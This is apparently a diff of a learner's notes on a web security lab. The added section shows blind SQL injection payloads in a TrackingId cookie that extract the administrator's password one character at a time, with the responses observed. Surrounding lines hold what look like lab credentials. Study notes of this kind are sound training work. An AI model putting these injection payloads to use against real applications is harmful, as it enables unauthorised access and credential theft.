@@ -47,3 +47,19 @@ yutk3v2n7a8tt6wco6n2
 wiener
 95ca28n08tuaahvqbeef
 ```
+
+## Blind SQL injection with conditional responses
+
+>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),1,1) > 'm'--;
+
+Welcome back!
+
+>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),1,1) = 'y'--;
+
+First letter is `y`
+
+>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),2,1) = '5'--;
+
+Second character is `5`. Numbers come before letters in SUBSTRING() !
+
+
